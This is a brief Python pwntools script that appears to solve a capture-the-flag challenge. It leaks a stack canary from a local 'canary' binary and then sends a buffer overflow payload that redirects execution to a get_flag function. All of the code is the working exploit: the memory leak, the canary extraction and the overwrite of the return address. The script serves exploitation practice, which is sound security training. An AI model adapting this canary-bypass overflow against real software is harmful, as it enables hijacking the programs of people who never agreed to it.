from pwn import *

context.terminal = ["terminator", "-e"]

#p = process("./docker/canary")
p = remote("localhost", 1024)
"""gdb.attach(p, '''
b *0x000000000040143b
c
''')
"""
# Found with gef patterns
canary_offset = 264
get_flag_offset = 0x0000000000401316

# Ignore some input
p.readuntil("?\n")

#Name length leak
p.sendline("300")
p.recvuntil("?\n")
#Name
p.sendline("a")

leak = p.recv(300)[0x115:(0x115+8)]
print(hexdump(leak))
#p.interactive()
canary = u64(leak)

payload = b"A"*264 
payload += p64(canary)
payload += b"B"*8
payload += p64(get_flag_offset)

p.sendline(str(len(payload)))
p.recvuntil("?\n")
p.sendline(payload)

log.info("check")
p.interactive()